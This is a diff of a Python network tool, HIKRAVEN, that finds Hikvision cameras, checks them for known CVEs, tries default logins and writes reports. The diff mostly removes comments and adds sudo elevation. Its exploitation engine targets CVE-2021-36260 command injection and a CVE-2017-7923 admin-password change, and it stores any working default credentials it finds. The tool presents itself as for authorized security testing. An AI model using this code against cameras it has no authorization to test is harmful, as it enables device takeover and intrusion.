         if other.interface and not self.interface:
             self.interface = other.interface
         
-        # Merge ports
         for port in other.open_ports:
             if port not in self.open_ports:
                 self.open_ports.append(port)
         
-        # Merge services
         self.services.update(other.services)
         
-        # Merge vulnerabilities (avoid duplicates)
         existing_cves = {v['cve_id'] for v in self.vulnerabilities}
         for vuln in other.vulnerabilities:
             if vuln['cve_id'] not in existing_cves:
                 self.vulnerabilities.append(vuln)
         
-        # Merge credentials
         for cred in other.credentials:
             if cred not in self.credentials:
                 self.credentials.append(cred)
         
-        # Merge tags
         for tag in other.tags:
             if tag not in self.tags:
                 self.tags.append(tag)
         
-        # Update timestamps
         self.last_seen = max(self.last_seen, other.last_seen)
         self.first_seen = min(self.first_seen, other.first_seen)
         
-        # Update confidence
         self.confidence = max(self.confidence, other.confidence)
         
-        # Update fingerprint
         self.fingerprint = generate_device_fingerprint(self)
 
 @dataclass
 class ScanResult:
-    """Container for scan results"""
     devices: List[HikDevice] = field(default_factory=list)
     total_devices: int = 0
     vulnerable_devices: int = 0
@@ -1750,13 +1628,11 @@ class ScanResult:
     
     @property
     def duration(self) -> float:
-        """Get scan duration"""
         if self.end_time:
             return self.end_time - self.start_time
         return self.scan_duration
     
     def to_dict(self) -> dict:
-        """Convert to dictionary"""
         return {
             'total_devices': self.total_devices,
             'vulnerable_devices': self.vulnerable_devices,
@@ -1772,13 +1648,10 @@ class ScanResult:
             'warnings': self.warnings
         }
 
-# ==================== DISCOVERY ENGINE ====================
-
 class DiscoveryEngine:
-    """Enhanced device discovery engine with multi-interface support"""
-    
     def __init__(self, interface: str, local_ip: str, logger: Logger,
-                 config: ConfigManager, rate_limiter: 'RateLimiter' = None):
+                 config: ConfigManager, rate_limiter: 'RateLimiter' = None,
+                 sudo_manager: SudoManager = None):
         self.interface = interface
         self.local_ip = local_ip
         self.logger = logger
@@ -1786,7 +1659,8 @@ class DiscoveryEngine:
         self.rate_limiter = rate_limiter or RateLimiter(
             config.get('scan.rate_limit', 20)
         )
-        self.interface_manager = InterfaceManager(logger)
+        self.sudo_manager = sudo_manager or SudoManager(logger)
+        self.interface_manager = InterfaceManager(logger, self.sudo_manager)
         self.discovered_devices: Dict[str, HikDevice] = {}
         self.db = Database()
         self._stop_scan = False
@@ -1795,41 +1669,37 @@ class DiscoveryEngine:
     
     @timing_decorator
     def discover(self, subnet: str = None, passive_timeout: int = 30) -> List[HikDevice]:
-        """Run discovery with multiple methods"""
         self.logger.section("Device Discovery")
         self.logger.info(f"Using interface: {self.interface}")
         self.logger.info(f"Local IP: {self.local_ip}")
         
-        # Validate interface
+        if self.sudo_manager.has_sudo:
+            self.logger.info("Running with elevated privileges - full discovery enabled")
+        else:
+            self.logger.warning("Limited privileges - some discovery features may be restricted")
+        
         if not self.interface_manager.validate_interface(self.interface):
             self.logger.warning(f"Interface {self.interface} may not be valid")
         
-        # Get interface info
         interface_info = self.interface_manager.get_interface(self.interface)
         if interface_info:
             self.logger.debug(f"Interface type: {interface_info['type']}")
             self.logger.debug(f"Interface MAC: {interface_info['mac']}")
         
-        # Passive discovery
         if self.config.get('discovery.use_arp', True):
             self.passive_discovery(timeout=passive_timeout)
         
-        # Active discovery
         if self.config.get('discovery.use_multicast', True):
             self._send_multicast_probe()
         
-        # Port scanning discovered devices
         if self.config.get('discovery.use_port_scan', True):
             self._port_scan_discovered()
         
-        # Subnet scan
         if subnet and self.config.get('discovery.use_ping_scan', True):
             self._scan_subnet(subnet)
         
-        # Enrich devices
         self._enrich_devices()
         
-        # Save to database
         for device in self.discovered_devices.values():
             device.interface = self.interface
             self.db.save_device(device)
@@ -1840,8 +1710,11 @@ class DiscoveryEngine:
         return devices
     
     def passive_discovery(self, timeout: int = 30) -> Dict[str, HikDevice]:
-        """Passive ARP sniffing"""
         self.logger.info(f"Passive ARP sniffing for {timeout}s...")
+        
+        if not self.sudo_manager.has_sudo:
+            self.logger.warning("ARP sniffing requires elevated privileges - using fallback methods")
+            return self._passive_discovery_fallback(timeout)
         
         found_ips = set()
         target_macs = set(self.known_ouis.keys())
@@ -1870,7 +1743,6 @@ class DiscoveryEngine:
                 self.logger.debug(f"Packet handler error: {e}")
         
         try:
-            # Build filter based on interface
             if self.interface:
                 scapy.sniff(
                     iface=self.interface,
@@ -1888,23 +1760,49 @@ class DiscoveryEngine:
                 )
         except Exception as e:
             self.logger.error(f"Passive discovery failed: {e}")
+            self._passive_discovery_fallback(timeout)
+        
+        return self.discovered_devices
+    
+    def _passive_discovery_fallback(self, timeout: int = 30) -> Dict[str, HikDevice]:
+        self.logger.info("Using ARP cache fallback...")
+        try:
+            peers = self.interface_manager.get_interface_peers(self.interface, timeout)
+            for peer in peers:
+                if peer['ip'] not in self.discovered_devices:
+                    device = HikDevice(
+                        ip_address=peer['ip'],
+                        mac_address=peer['mac'],
+                        interface=self.interface
+                    )
+                    for oui, manufacturer in self.known_ouis.items():
+                        if peer['mac'] and peer['mac'].lower().startswith(oui):
+                            device.manufacturer = manufacturer
+                            break
+                    self.discovered_devices[peer['ip']] = device
+                    self.logger.debug(f"Found device from ARP cache: {peer['ip']}")
+        except Exception as e:
+            self.logger.debug(f"Fallback discovery error: {e}")
         
         return self.discovered_devices
     
     @safe_operation()
     def _send_multicast_probe(self):
-        """Send UDP multicast probe"""
         self.logger.debug("Sending multicast probe...")
         
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
         sock.settimeout(2)
         
+        if self.sudo_manager.has_sudo:
+            try:
+                if self.interface:
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, 
+                                   self.interface.encode())
+            except:
+                pass
+        
         try:
-            # Bind to interface if specified
-            if self.interface:
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, 
-                               self.interface.encode())
             sock.bind((self.local_ip, 0))
         except:
             try:
@@ -1915,10 +1813,8 @@ class DiscoveryEngine:
         probe = '<?xml version="1.0" encoding="utf-8"?><Probe>' \
                 '<Uuid>HIKRAVEN-SCAN</Uuid><Types>inquiry</Types></Probe>'
         
-        # Send to multicast address
         sock.sendto(probe.encode(), ('239.255.255.250', 37020))
         
-        # Listen for responses
         start_time = time.time()
         while time.time() - start_time < 5 and not self._stop_scan:
             try:
@@ -1934,11 +1830,9 @@ class DiscoveryEngine:
         sock.close()
     
     def _parse_device_response(self, data: bytes, ip: str):
-        """Parse XML response from device"""
         try:
             root = ET.fromstring(data)
             
-            # Get device IP
             ip_addr = root.find('IPv4Address')
             device_ip = ip_addr.text if ip_addr is not None else ip
             
@@ -1947,7 +1841,6 @@ class DiscoveryEngine:
             else:
                 device = HikDevice(ip_address=device_ip, interface=self.interface)
             
-            # Extract device info
             desc = root.find('DeviceDescription')
             if desc is not None and desc.text:
                 device.description = desc.text
@@ -1960,7 +1853,6 @@ class DiscoveryEngine:
             if mac is not None and mac.text:
                 mac_addr = mac.text.replace('-', ':').lower()
                 device.mac_address = mac_addr
-                # Check OUI
                 for oui, manufacturer in self.known_ouis.items():
                     if mac_addr.startswith(oui):
                         device.manufacturer = manufacturer
@@ -1982,7 +1874,6 @@ class DiscoveryEngine:
             if activated is not None and activated.text:
                 device.activation_status = activated.text
             
-            # Add to discovered
             if device.ip_address not in self.discovered_devices:
                 self.discovered_devices[device.ip_address] = device
             else:
@@ -1997,7 +1888,6 @@ class DiscoveryEngine:
     
     @safe_operation()
     def _port_scan_discovered(self):
-        """Port scan discovered devices"""
         devices_to_scan = list(self.discovered_devices.keys())
         if not devices_to_scan:
             return
@@ -2023,7 +1913,6 @@ class DiscoveryEngine:
                     self.logger.debug(f"Port scan error for {ip}: {e}")
     
     def _scan_ports(self, ip: str, ports: List[int], timeout: float) -> List[int]:
-        """Scan ports on a single IP"""
         open_ports = []
         
         for port in ports:
@@ -2044,20 +1933,17 @@ class DiscoveryEngine:
     
     @safe_operation()
     def _scan_subnet(self, subnet: str):
-        """Scan subnet for devices"""
         self.logger.info(f"Scanning subnet: {subnet}")
         
         try:
             network = ipaddress.ip_network(subnet, strict=False)
             hosts = list(network.hosts())
             
-            # Limit hosts
             max_hosts = self.config.get('discovery.max_hosts', 65535)
             if len(hosts) > max_hosts:
                 hosts = hosts[:max_hosts]
                 self.logger.warning(f"Limiting scan to {max_hosts} hosts")
             
-            # Ping scan
             self.logger.info(f"Ping scanning {len(hosts)} hosts...")
             active_hosts = []
             
@@ -2080,7 +1966,6 @@ class DiscoveryEngine:
             
             self.logger.info(f"Found {len(active_hosts)} active hosts")
             
-            # Port scan active hosts
             if active_hosts:
                 self.logger.info("Port scanning active hosts...")
                 ports = self.config.get('discovery.ports', Constants.HIKVISION_PORTS)
@@ -2114,19 +1999,16 @@ class DiscoveryEngine:
             self.logger.error(f"Subnet scan error: {e}")
     
     def _ping_host(self, ip: str) -> bool:
-        """Ping a host"""
-        # Try scapy ICMP
-        try:
-            packet = scapy.IP(dst=ip)/scapy.ICMP()
-            reply = scapy.sr1(packet, timeout=2, verbose=False)
-            if reply:
-                return True
-        except:
-            pass
+        if self.sudo_manager.has_sudo:
+            try:
+                packet = scapy.IP(dst=ip)/scapy.ICMP()
+                reply = scapy.sr1(packet, timeout=2, verbose=False)
+                if reply:
+                    return True
+            except:
+                pass
         
-        # Fallback to system ping
         try:
-            # Windows
             if os.name == 'nt':
                 result = subprocess.run(
                     ['ping', '-n', '1', '-w', '2000', ip],
@@ -2144,11 +2026,9 @@ class DiscoveryEngine:
             return False
     
     def _enrich_devices(self):
-        """Enrich device information"""
         self.logger.debug("Enriching device information...")
         
         for ip, device in self.discovered_devices.items():
-            # Reverse DNS
             if not device.hostname:
                 try:
                     hostname = socket.gethostbyaddr(ip)[0]
@@ -2156,48 +2036,39 @@ class DiscoveryEngine:
                 except:
                     pass
             
-            # Web info
             if 80 in device.open_ports or 443 in device.open_ports:
                 self._get_web_info(device)
             
-            # Cloud management
             if not device.is_cloud_managed:
                 self._check_cloud_management(device)
     
     @safe_operation()
     def _get_web_info(self, device: HikDevice):
-        """Get info from web interface"""
         port = 443 if 443 in device.open_ports else 80
         protocol = 'https' if port == 443 else 'http'
         url = f"{protocol}://{device.ip_address}:{port}"
         
         try:
-            # Try to get device info page
             response = requests.get(f"{url}/web/", timeout=5, verify=False)
             if response.status_code == 200:
                 text = response.text
                 
-                # Extract model
                 match = re.search(r'var model\s*=\s*"([^"]+)"', text)
                 if match and not device.model:
                     device.model = match.group(1)
                 
-                # Extract firmware version
                 match = re.search(r'var firmwareVersion\s*=\s*"([^"]+)"', text)
                 if match and not device.firmware_version:
                     device.firmware_version = match.group(1)
                 
-                # Extract software version
                 match = re.search(r'var softwareVersion\s*=\s*"([^"]+)"', text)
                 if match and not device.software_version:
                     device.software_version = match.group(1)
                 
-                # Extract serial number
                 match = re.search(r'var serialNumber\s*=\s*"([^"]+)"', text)
                 if match and not device.serial_number:
                     device.serial_number = match.group(1)
                 
-                # Extract activation status
                 match = re.search(r'var activated\s*=\s*"([^"]+)"', text)
                 if match and not device.activation_status:
                     device.activation_status = match.group(1)
@@ -2206,7 +2077,6 @@ class DiscoveryEngine:
     
     @safe_operation()
     def _check_cloud_management(self, device: HikDevice):
-        """Check if device is cloud managed"""
         if 80 not in device.open_ports and 443 not in device.open_ports:
             return
         
@@ -2226,14 +2096,9 @@ class DiscoveryEngine:
             pass
     
     def stop(self):
-        """Stop discovery"""
         self._stop_scan = True
 
-# ==================== RATE LIMITER ====================
-
 class RateLimiter:
-    """Enhanced rate limiter with token bucket"""
-    
     def __init__(self, max_requests_per_second: int = 20):
         self.max_requests = max_requests_per_second
         self.tokens = max_requests_per_second
@@ -2242,28 +2107,23 @@ class RateLimiter:
         self.request_times = deque(maxlen=1000)
     
     def wait_if_needed(self):
-        """Wait if rate limit would be exceeded"""
         with self.lock:
             current_time = time.time()
             
-            # Refill tokens
             time_passed = current_time - self.last_refill
             self.tokens = min(self.max_requests, 
                              self.tokens + time_passed * self.max_requests)
             self.last_refill = current_time
             
-            # Clean old request times
             while self.request_times and current_time - self.request_times[0] > 1:
                 self.request_times.popleft()
             
-            # Check if we need to wait
             if len(self.request_times) >= self.max_requests:
                 oldest = self.request_times[0]
                 wait_time = 1 - (current_time - oldest)
                 if wait_time > 0:
                     time.sleep(wait_time)
             
-            # Check if we have tokens
             if self.tokens < 1:
                 wait_time = 1.0 / self.max_requests
                 time.sleep(wait_time)
@@ -2274,17 +2134,12 @@ class RateLimiter:
             self.request_times.append(time.time())
     
     def reset(self):
-        """Reset rate limiter"""
         with self.lock:
             self.request_times.clear()
             self.tokens = self.max_requests
             self.last_refill = time.time()
 
-# ==================== VULNERABILITY SCANNER ====================
-
 class VulnerabilityScanner:
-    """Advanced vulnerability scanner with comprehensive checks"""
-    
     def __init__(self, logger: Logger, config: ConfigManager,
                  rate_limiter: RateLimiter = None):
         self.logger = logger
@@ -2298,7 +2153,6 @@ class VulnerabilityScanner:
         self.found_vulnerabilities = []
     
     def _setup_session(self) -> requests.Session:
-        """Setup requests session with retry strategy"""
         session = requests.Session()
         retry_strategy = Retry(
             total=3,
@@ -2314,7 +2168,6 @@ class VulnerabilityScanner:
     
     @timing_decorator
     def scan_device(self, device: HikDevice) -> Dict[str, List[dict]]:
-        """Scan a device for vulnerabilities"""
         self.logger.debug(f"Scanning {device.ip_address} for vulnerabilities...")
         
         results = {
@@ -2324,7 +2177,6 @@ class VulnerabilityScanner:
             'misconfigurations': []
         }
         
-        # Check CVEs
         cves_to_check = self.config.get('vulnerability.cves', 
                                         list(self.vulnerability_signatures.keys()))
         
@@ -2353,7 +2205,6 @@ class VulnerabilityScanner:
                     self.db.save_vulnerability(device.ip_address, vuln)
                     self.found_vulnerabilities.append(vuln)
         
-        # Check default credentials
         if self.config.get('vulnerability.check_default_creds', True):
             if device.open_ports and any(p in device.open_ports for p in Constants.HTTP_PORTS):
                 self._check_default_credentials(device, results)
@@ -2361,7 +2212,6 @@ class VulnerabilityScanner:
         return results
     
     def _check_vulnerability(self, ip: str, signature: dict) -> bool:
-        """Check if device is vulnerable to a specific CVE"""
         try:
             self.rate_limiter.wait_if_needed()
             
@@ -2382,26 +2232,20 @@ class VulnerabilityScanner:
                     timeout=self.config.get('vulnerability.timeout_per_check', 5)
                 )
             
-            # Check for vulnerability indicators
             if response.status_code in [200, 401, 403]:
-                # Check for detection string
                 detection = signature.get('detection', '')
                 if detection and detection in response.text:
                     return True                
-                # Try XML parsing
                 try:
                     root = ET.fromstring(response.content)
-                    # Check for status code
                     status = root.find('statusCode')
                     if status is not None and status.text == '1':
                         return True
-                    # Check for response data
                     if len(response.content) > 50:
                         return True
                 except:
                     pass
                 
-                # Generic check: got a response
                 if len(response.content) > 0 and response.status_code == 200:
                     return True
             
@@ -2411,7 +2255,6 @@ class VulnerabilityScanner:
             return False
     
     def _check_default_credentials(self, device: HikDevice, results: dict):
-        """Check for default credentials"""
         self.logger.debug(f"Checking default credentials on {device.ip_address}")
         
         port = 443 if 443 in device.open_ports else 80
@@ -2432,14 +2275,13 @@ class VulnerabilityScanner:
                 device.credentials.append((username, password))
                 device.tags.append('default-creds')
                 self.logger.warning(f"Default credentials found: {username}:{password}")
-                break  # Found valid credentials, no need to check more
+                break
             
             checked += 1
             if checked >= max_checks:
                 break
     
     def _check_auth(self, base_url: str, username: str, password: str) -> bool:
-        """Check if credentials work"""
         try:
             self.rate_limiter.wait_if_needed()
             
@@ -2457,11 +2299,7 @@ class VulnerabilityScanner:
         except Exception:
             return False
 
-# ==================== EXPLOITATION ENGINE ====================
-
 class ExploitationEngine:
-    """Exploitation engine for authorized testing"""
-    
     def __init__(self, logger: Logger, config: ConfigManager,
                  rate_limiter: RateLimiter = None):
         self.logger = logger
@@ -2474,7 +2312,6 @@ class ExploitationEngine:
         self._safe_mode = config.get('exploitation.safe_mode', True)
     
     def _setup_session(self) -> requests.Session:
-        """Setup requests session"""
         session = requests.Session()
         session.verify = False
         session.timeout = self.config.get('scan.timeout', 10)
@@ -2482,7 +2319,6 @@ class ExploitationEngine:
     
     @safe_operation()
     def exploit_cve_2021_36260(self, device: HikDevice) -> Optional[Dict]:
-        """Exploit CVE-2021-36260 - Command Injection"""
         if self._safe_mode:
             self.logger.info(f"Testing CVE-2021-36260 on {device.ip_address} (safe mode)")
         else:
@@ -2498,7 +2334,6 @@ class ExploitationEngine:
             self.rate_limiter.wait_if_needed()
             url = f"http://{device.ip_address}/SDK/webLanguage"
             
-            # Test commands
             test_commands = ["whoami", "id", "uname -a"]
             
             if not self._safe_mode:
@@ -2536,7 +2371,6 @@ class ExploitationEngine:
     
     @safe_operation()
     def exploit_cve_2017_7923(self, device: HikDevice) -> Dict:
-        """Exploit CVE-2017-7923 - Change admin password"""
         if self._safe_mode:
             self.logger.info(f"Testing CVE-2017-7923 on {device.ip_address} (safe mode)")
             return {'success': False, 'new_password': None, 'method': 'CVE-2017-7923'}
@@ -2590,18 +2424,13 @@ class ExploitationEngine:
             self.logger.debug(f"Exploit error: {e}")
             return results
 
-# ==================== REPORT GENERATOR ====================
-
 class ReportGenerator:
-    """Professional report generation"""
-    
     def __init__(self, logger: Logger, config: ConfigManager):
         self.logger = logger
         self.config = config
         self.db = Database()
     
     def generate(self, devices: List[HikDevice], formats: List[str] = None) -> List[str]:
-        """Generate reports in specified formats"""
         if formats is None:
             formats = self.config.get('reporting.formats', ['json', 'html', 'csv'])
         
@@ -2635,13 +2464,11 @@ class ReportGenerator:
         return reports
     
     def _generate_json(self, devices: List[HikDevice], output_dir: str) -> str:
-        """Generate JSON report"""
         timestamp = get_timestamp()
         output_file = os.path.join(output_dir, f"hikraven_report_{timestamp}.json")
         
         report_data = {
             'generated': datetime.now().isoformat(),
-            'version': __version__,
             'platform': detect_platform(),
             'total_devices': len(devices),
             'vulnerable_devices': sum(1 for d in devices if d.get_vulnerability_count() > 0),
@@ -2653,7 +2480,6 @@ class ReportGenerator:
         with open(output_file, 'w') as f:
             json.dump(report_data, f, indent=2)
         
-        # Compress if configured
         if self.config.get('reporting.compress', False):
             try:
                 with open(output_file, 'rb') as f:
@@ -2668,7 +2494,6 @@ class ReportGenerator:
         return output_file
     
     def _generate_html(self, devices: List[HikDevice], output_dir: str) -> str:
-        """Generate professional HTML report"""
         timestamp = get_timestamp()
         output_file = os.path.join(output_dir, f"hikraven_report_{timestamp}.html")
         
@@ -2873,7 +2698,6 @@ class ReportGenerator:
         <div class="header">
             <h1>🔒 HIKRAVEN Security Report</h1>
             <div class="subtitle">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
-            <div class="subtitle">Version: {__version__}</div>
             <div class="subtitle">Platform: {platform.system()} {platform.release()}</div>
         </div>
         
@@ -2901,7 +2725,6 @@ class ReportGenerator:
         </div>
 '''
         
-        # Device details
         for device in devices:
             vuln_count = device.get_vulnerability_count()
             status_class = "vulnerable" if vuln_count > 0 else "safe"
@@ -2965,7 +2788,6 @@ class ReportGenerator:
                     </span></td></tr>
 '''
             
-            # Severity bar
             if vuln_count > 0:
                 score = min(device.get_severity_score(), 100)
                 html += f'''
@@ -2980,7 +2802,7 @@ class ReportGenerator:
         
         html += f'''
         <div class="footer">
-            <p>Report generated by HIKRAVEN v{__version__}</p>
+            <p>Report generated by HIKRAVEN</p>
             <p style="font-size:12px; margin-top:5px; color:#444;">
                 ⚠️ This report is for authorized security testing only.
             </p>
@@ -2996,7 +2818,6 @@ class ReportGenerator:
         return output_file
     
     def _generate_csv(self, devices: List[HikDevice], output_dir: str) -> str:
-        """Generate CSV report"""
         import csv
         
         timestamp = get_timestamp()
@@ -3034,19 +2855,16 @@ class ReportGenerator:
         return output_file
     
     def _generate_pdf(self, devices: List[HikDevice], output_dir: str) -> str:
-        """Generate PDF report (uses HTML conversion)"""
         self.logger.warning("PDF generation not implemented, using HTML instead")
         return self._generate_html(devices, output_dir)
     
     def _generate_markdown(self, devices: List[HikDevice], output_dir: str) -> str:
-        """Generate Markdown report"""
         timestamp = get_timestamp()
         output_file = os.path.join(output_dir, f"hikraven_report_{timestamp}.md")
         
         md = f"""# HIKRAVEN Security Assessment Report
 
 **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
-**Version:** {__version__}  
 **Platform:** {platform.system()} {platform.release()}
 
 ## Executive Summary
@@ -3088,8 +2906,8 @@ class ReportGenerator:
         
         md += """
 ---
-*Report generated by HIKRAVEN v{} - For authorized security testing only*
-""".format(__version__)
+*Report generated by HIKRAVEN - For authorized security testing only*
+"""
         
         with open(output_file, 'w', encoding='utf-8') as f:
             f.write(md)
@@ -3097,7 +2915,6 @@ class ReportGenerator:
         return output_file
     
     def _get_severity_summary(self, devices: List[HikDevice]) -> dict:
-        """Get severity summary"""
         summary = defaultdict(int)
         for device in devices:
             for vuln in device.vulnerabilities:
@@ -3105,11 +2922,7 @@ class ReportGenerator:
                 summary[severity] += 1
         return dict(summary)
 
-# ==================== PLUGIN SYSTEM ====================
-
 class PluginManager:
-    """Simple plugin system for extensibility"""
-    
     def __init__(self, logger: Logger, config: ConfigManager):
         self.logger = logger
         self.config = config
@@ -3118,7 +2931,6 @@ class PluginManager:
         os.makedirs(self.plugin_dir, exist_ok=True)
     
     def load_plugins(self):
-        """Load plugins from directory"""
         if not self.config.get('plugins.enabled', True):
             return
         
@@ -3146,7 +2958,6 @@ class PluginManager:
                 self.logger.debug(f"Failed to load plugin {plugin_file}: {e}")
     
     def execute_hook(self, hook_name: str, *args, **kwargs):
-        """Execute plugin hooks"""
         results = []
         for plugin_name, plugin in self.plugins.items():
             if hasattr(plugin, hook_name):
@@ -3158,15 +2969,12 @@ class PluginManager:
                     self.logger.debug(f"Plugin {plugin_name} hook {hook_name} failed: {e}")
         return results
 
-# ==================== MAIN APPLICATION ====================
-
 class HikRaven:
-    """Main application class"""
-    
     def __init__(self):
         self.config = ConfigManager()
         self.logger = None
         self.db = Database()
+        self.sudo_manager = SudoManager()
         self.interface_manager = InterfaceManager()
         self.discovery_engine = None
         self.vulnerability_scanner = None
@@ -3181,16 +2989,17 @@ class HikRaven:
         self._stats = {}
     
     def initialize(self, interface: str = None, local_ip: str = None, 
-                   verbose: bool = False, auto_detect: bool = True):
-        """Initialize all components with interface detection"""
-        # Auto-detect interface if not specified
+                   verbose: bool = False, auto_detect: bool = True,
+                   elevate: bool = False):
+        if elevate:
+            self.sudo_manager.elevate()
+        
         if auto_detect and not interface:
             iface_name, ip = self.interface_manager.get_primary_ip()
             interface = iface_name
             local_ip = ip
-            self.logger = None  # Will be created below
+            self.logger = None
         
-        # If local_ip not provided, get from interface
         if not local_ip and interface:
             local_ip = self.interface_manager.get_ip_from_interface(interface)
             if not local_ip:
@@ -3199,7 +3008,6 @@ class HikRaven:
         if not local_ip:
             local_ip = get_local_ip()
         
-        # Initialize logger
         log_level = 'DEBUG' if verbose else self.config.get('logging.level', 'INFO')
         console_output = self.config.get('logging.console_output', True)
         
@@ -3211,12 +3019,16 @@ class HikRaven:
         )
         
         self.logger.section("HIKRAVEN Initialization")
-        self.logger.info(f"Version: {__version__}")
         self.logger.info(f"Interface: {interface}")
         self.logger.info(f"IP Address: {local_ip}")
         self.logger.info(f"Platform: {platform.system()} {platform.release()}")
         
-        # Get interface info
+        if self.sudo_manager.has_sudo:
+            self.logger.info("✅ Running with elevated privileges - full functionality enabled")
+        else:
+            self.logger.warning("⚠️  Limited privileges detected - some features may be restricted")
+            self.logger.info("Run with sudo or as Administrator for full functionality")
+        
         if interface:
             iface_info = self.interface_manager.get_interface(interface)
             if iface_info:
@@ -3226,9 +3038,9 @@ class HikRaven:
                     self.logger.debug(f"Interface Speed: {iface_info['speed']} Mbps")
                 self.logger.debug(f"Interface MTU: {iface_info['mtu']}")
         
-        # Initialize components
         self.discovery_engine = DiscoveryEngine(
-            interface, local_ip, self.logger, self.config, self.rate_limiter
+            interface, local_ip, self.logger, self.config, self.rate_limiter,
+            self.sudo_manager
         )
         self.vulnerability_scanner = VulnerabilityScanner(
             self.logger, self.config, self.rate_limiter
@@ -3238,7 +3050,6 @@ class HikRaven:
         )
         self.report_generator = ReportGenerator(self.logger, self.config)
         
-        # Initialize plugin system
         self.plugin_manager = PluginManager(self.logger, self.config)
         self.plugin_manager.load_plugins()
         
@@ -3252,7 +3063,6 @@ class HikRaven:
                       subnet: str = None,
                       vuln_scan: bool = False,
                       exploit: bool = False) -> ScanResult:
-        """Run the complete scan"""
         if not self._initialized:
             raise HikRavenError("Scanner not initialized")
         
@@ -3262,10 +3072,8 @@ class HikRaven:
         self.logger.info(f"Target: {subnet or 'Local network'}")
         self.logger.info(f"Interface: {self.discovery_engine.interface}")
         
-        # Execute plugin pre-scan hooks
         self.plugin_manager.execute_hook('pre_scan', scan_type, subnet)
         
-        # Phase 1: Discovery
         self.logger.section("Phase 1: Device Discovery")
         
         try:
@@ -3275,7 +3083,6 @@ class HikRaven:
                 )
                 self.devices = list(devices.values())
             else:
-                # First passive then active
                 self.discovery_engine.passive_discovery(
                     self.config.get('discovery.passive_timeout', 15)
                 )
@@ -3287,7 +3094,6 @@ class HikRaven:
         
         self.logger.info(f"Discovered {len(self.devices)} devices")
         
-        # Phase 2: Vulnerability Scanning
         if vuln_scan and self.devices:
             self.logger.section("Phase 2: Vulnerability Scanning")
             
@@ -3319,7 +3125,6 @@ class HikRaven:
             except Exception as e:
                 self.logger.error(f"Vulnerability scanning failed: {e}")
         
-        # Phase 3: Exploitation
         if exploit and self.config.get('exploitation.enabled', False):
             self.logger.section("Phase 3: Exploitation")
             self.logger.warning("⚠️  Exploitation enabled - proceed with caution")
@@ -3342,10 +3147,8 @@ class HikRaven:
             except Exception as e:
                 self.logger.error(f"Exploitation failed: {e}")
         
-        # Phase 4: Post-processing
         self.logger.section("Phase 4: Post-processing")
         
-        # Calculate statistics
         self._stats = {
             'total_devices': len(self.devices),
             'vulnerable_devices': sum(1 for d in self.devices if d.get_vulnerability_count() > 0),
@@ -3354,7 +3157,6 @@ class HikRaven:
             'weak_creds': sum(1 for d in self.devices if d.credentials)
         }
         
-        # Create scan result
         duration = time.time() - self.start_time
         
         self.scan_results = ScanResult(
@@ -3369,10 +3171,8 @@ class HikRaven:
             end_time=time.time()
         )
         
-        # Save to database
         self._save_to_database()
         
-        # Execute plugin post-scan hooks
         self.plugin_manager.execute_hook('post_scan', self.scan_results)
         
         self.logger.success(f"Scan completed in {duration:.2f} seconds")
@@ -3381,12 +3181,10 @@ class HikRaven:
         return self.scan_results
     
     def _save_to_database(self):
-        """Save results to database"""
         try:
             for device in self.devices:
                 self.db.save_device(device)
             
-            # Save scan history
             with sqlite3.connect(Constants.DB_PATH) as conn:
                 cursor = conn.cursor()
                 cursor.execute("""
@@ -3409,7 +3207,6 @@ class HikRaven:
             self.logger.debug(f"Database save error: {e}")
     
     def generate_reports(self, formats: List[str] = None) -> List[str]:
-        """Generate reports"""
         if not self.devices:
             self.logger.warning("No devices to report")
             return []
@@ -3417,7 +3214,6 @@ class HikRaven:
         return self.report_generator.generate(self.devices, formats)
     
     def print_summary(self):
-        """Print scan summary using rich formatting"""
         if not self.devices:
             self.logger.warning("No scan results available")
             return
@@ -3429,7 +3225,6 @@ class HikRaven:
             padding=(1, 4)
         ))
         
-        # Statistics
         stats_table = Table(box=box.ROUNDED, border_style="cyan")
         stats_table.add_column("Metric", style="cyan")
         stats_table.add_column("Value", style="white")
@@ -3441,13 +3236,13 @@ class HikRaven:
         stats_table.add_row("Weak Credentials", str(self._stats['weak_creds']))
         stats_table.add_row("Scan Duration", f"{self.scan_results.duration:.2f}s")
         stats_table.add_row("Interface", self.scan_results.interface)
+        stats_table.add_row("Privileges", "✅ Elevated" if self.sudo_manager.has_sudo else "⚠️  Limited")
         
         if self.scan_results.network_range:
             stats_table.add_row("Network Range", self.scan_results.network_range)
         
         console.print(stats_table)
         
-        # Vulnerable devices list
         if self.devices:
             console.print()
             devices_table = Table(box=box.ROUNDED, border_style="yellow")
@@ -3477,7 +3272,6 @@ class HikRaven:
             
             console.print(devices_table)
         
-        # Vulnerability breakdown
         if self._stats['total_vulnerabilities'] > 0:
             console.print()
             vuln_table = Table(box=box.ROUNDED, border_style="red")
@@ -3512,7 +3306,6 @@ class HikRaven:
         console.print(f"[dim]Report saved to: {self.config.get('reporting.output_dir', Constants.OUTPUT_DIR)}[/dim]")
     
     def _get_threat_color(self, level: str) -> str:
-        """Get color for threat level"""
         colors = {
             'CRITICAL': 'red',
             'HIGH': 'red1',
@@ -3523,7 +3316,6 @@ class HikRaven:
         return colors.get(level, 'white')
     
     def _get_severity_color(self, severity: str) -> str:
-        """Get color for severity"""
         colors = {
             'CRITICAL': 'red',
             'HIGH': 'red1',
@@ -3534,21 +3326,17 @@ class HikRaven:
         return colors.get(severity, 'white')
     
     def get_statistics(self) -> dict:
-        """Get scan statistics"""
         return {
             'scan': self._stats,
             'database': self.db.get_statistics(),
-            'interfaces': len(self.interface_manager.interfaces)
+            'interfaces': len(self.interface_manager.interfaces),
+            'privileges': 'elevated' if self.sudo_manager.has_sudo else 'limited'
         }
     
     def list_interfaces(self) -> List[Dict]:
-        """List all available interfaces"""
         return list(self.interface_manager.interfaces.values())
 
-# ==================== COMMAND LINE ====================
-
 def parse_arguments():
-    """Parse command line arguments"""
     parser = argparse.ArgumentParser(
         description=f'HIKRAVEN - {__description__}',
         epilog='Use responsibly and only on authorized systems!',
@@ -3603,6 +3391,9 @@ def parse_arguments():
                        type=int,
                        default=10)
     
+    parser.add_argument('--sudo', '-S',
+                       help='Request elevated privileges (sudo on Linux, admin on Windows)',
+                       action='store_true')
     parser.add_argument('--config', '-c',
                        help='Configuration file path',
                        default=Constants.CONFIG_PATH)
